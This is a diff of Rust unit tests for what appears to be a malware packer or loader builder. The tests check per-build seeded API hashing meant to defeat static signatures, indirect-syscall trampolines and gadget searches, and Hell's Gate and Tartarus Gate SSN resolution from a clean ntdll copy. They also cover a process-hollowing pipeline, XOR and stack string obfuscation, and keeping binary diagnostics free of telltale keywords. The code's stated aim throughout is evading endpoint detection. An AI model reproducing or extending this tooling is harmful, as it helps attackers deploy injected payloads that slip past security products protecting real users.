+        assert_eq!(h(b"NtAllocateVirtualMemory"), 0x4fe2_32be_2dca_3638);
+        assert_eq!(h(b"NtGetContextThread"), 0x60b6_1d0a_f197_a950);
     }
 
     #[test]
     fn api_hash_is_deterministic() {
-        assert_eq!(
-            api_hash(b"NtWriteVirtualMemory"),
-            api_hash(b"NtWriteVirtualMemory")
+        let h = |name: &[u8]| {
+            resolvers::api_hash::api_hash_with(name, resolvers::api_hash::OFFSET_BASIS)
+        };
+        assert_eq!(h(b"NtWriteVirtualMemory"), h(b"NtWriteVirtualMemory"));
+        assert_ne!(h(b"NtWriteVirtualMemory"), h(b"NtReadVirtualMemory"));
+    }
+
+    #[test]
+    fn api_hash_constants_are_build_seeded() {
+        // The packer emits a per-build FNV basis (`API_HASH_SEED`), so the same
+        // function hashes to a different constant in a different build — a
+        // fixed basis would be a static signature.
+        let one = render_block_with(
+            &api_hash_config(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
         );
+        let two = render_block_with(
+            &api_hash_config(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED ^ 0xdead_beef,
+        );
+        let consts = |block: &str| -> Vec<String> {
+            block
+                .lines()
+                .filter(|line| line.contains("resolve_ssn(&file, 0x"))
+                .map(|line| line.trim().to_string())
+                .collect()
+        };
+        assert!(
+            one.contains("const API_HASH_SEED"),
+            "the seed const is missing"
+        );
+        assert!(!consts(&one).is_empty(), "no hash constants emitted");
         assert_ne!(
-            api_hash(b"NtWriteVirtualMemory"),
-            api_hash(b"NtReadVirtualMemory")
+            consts(&one),
+            consts(&two),
+            "the constants must vary by build"
         );
     }
 
@@ -2410,11 +1943,38 @@ mod tests {
         assert_eq!(find_gadget_offset(&[0x0F, 0x05]), None);
     }
 
+    #[test]
+    fn find_gadget_accepts_a_retf_terminator() {
+        // Some builds end the stub with `syscall; retf` (CB) instead of `ret`.
+        let bytes = [0x90, 0x0F, 0x05, 0xCB, 0xCC];
+        assert_eq!(find_gadget_offset(&bytes), Some(1));
+    }
+
+    #[test]
+    fn syscall_diagnostics_are_keyword_free() {
+        // The always-compiled `SyscallError` messages live in the prelude and
+        // reach the binary; none may name a resolver or a hook. (The `tech_dbg!`
+        // strings are inert unless `build.stub.debug` is set.)
+        let prelude = crate::engine::syscalls::prelude::INDIRECT_PRELUDE;
+        for keyword in ["hells_gate", "tartarus_gate", "api_hash", "hooked"] {
+            assert!(
+                !prelude.contains(keyword),
+                "diagnostic prelude names '{keyword}'"
+            );
+        }
+    }
+
     // --- rendered block (tests 6 and 7 of the phase spec) ---
 
     #[test]
     fn indirect_block_obfuscates_the_nt_names() {
-        let block = render_block_with(&indirect(), &hollowing_pipeline(), &xor_config(), &[]);
+        let block = render_block_with(
+            &indirect(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
 
         // The names must be reconstructed at runtime, never cleartext outside
         // comments (doc comments never reach the binary; the guardrail strips
@@ -2431,7 +1991,7 @@ mod tests {
         );
         assert!(block.contains("crate::dec_xor"), "xor strategy not applied");
         assert!(
-            block.contains("resolve_ssn(module, &"),
+            block.contains("resolve_ssn_with_fallback(module, &"),
             "no resolution lines"
         );
         assert!(!block.contains('$'), "leftover placeholders: {block}");
@@ -2439,7 +1999,13 @@ mod tests {
 
     #[test]
     fn indirect_block_contains_the_trampoline_and_ssn_table() {
-        let block = render_block_with(&indirect(), &hollowing_pipeline(), &xor_config(), &[]);
+        let block = render_block_with(
+            &indirect(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
         assert!(block.contains("global_asm"), "trampoline missing");
         assert!(block.contains("jmp r11"), "gadget jump missing");
         assert!(block.contains("struct SsnTable"), "SSN table missing");
@@ -2450,7 +2016,13 @@ mod tests {
 
     #[test]
     fn tartarus_gate_block_reads_ssns_from_a_clean_file_copy() {
-        let block = render_block_with(&tartarus(), &hollowing_pipeline(), &xor_config(), &[]);
+        let block = render_block_with(
+            &tartarus(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
 
         // The resolver walks a clean copy of ntdll read from disk, not the
         // live module's export stubs.
@@ -2473,7 +2045,13 @@ mod tests {
 
     #[test]
     fn tartarus_gate_block_obfuscates_the_ntdll_path_and_names() {
-        let block = render_block_with(&tartarus(), &hollowing_pipeline(), &xor_config(), &[]);
+        let block = render_block_with(
+            &tartarus(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(
             leaked.is_empty(),
@@ -2488,6 +2066,7 @@ mod tests {
             &hollowing_pipeline(),
             &xor_config(),
             &[],
+            TEST_SEED,
         );
 
         // The resolver matches exports by a precomputed hash, so no NT name
@@ -2528,6 +2107,7 @@ mod tests {
             &hollowing_pipeline(),
             &xor_config(),
             &[],
+            TEST_SEED,
         );
 
         assert!(
@@ -2552,6 +2132,7 @@ mod tests {
             &hollowing_pipeline(),
             &xor_config(),
             &[],
+            TEST_SEED,
         );
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(
@@ -2564,7 +2145,13 @@ mod tests {
 
     #[test]
     fn empty_pipeline_renders_a_no_op_block() {
-        let block = render_block_with(&indirect(), &sleep_pipeline(), &xor_config(), &[]);
+        let block = render_block_with(
+            &indirect(),
+            &sleep_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
         assert!(block.contains("fn init_syscalls"), "no-op init missing");
         assert!(
             !block.contains("global_asm"),
@@ -2575,7 +2162,13 @@ mod tests {
             "no helpers without requirements"
         );
 
-        let none_block = render_block_with(&SyscallsConfig::default(), &[], &xor_config(), &[]);
+        let none_block = render_block_with(
+            &SyscallsConfig::default(),
+            &[],
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
         assert!(none_block.contains("fn init_syscalls"));
         assert!(!none_block.contains("VirtualAllocEx"));
     }
@@ -2586,7 +2179,7 @@ mod tests {
             strategy: StringStrategy::Stack,
             key: None,
         };
-        let block = render_block_with(&indirect(), &hollowing_pipeline(), &stack, &[]);
+        let block = render_block_with(&indirect(), &hollowing_pipeline(), &stack, &[], TEST_SEED);
         assert!(!block.contains("dec_xor"), "stack must not use dec_xor");
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(
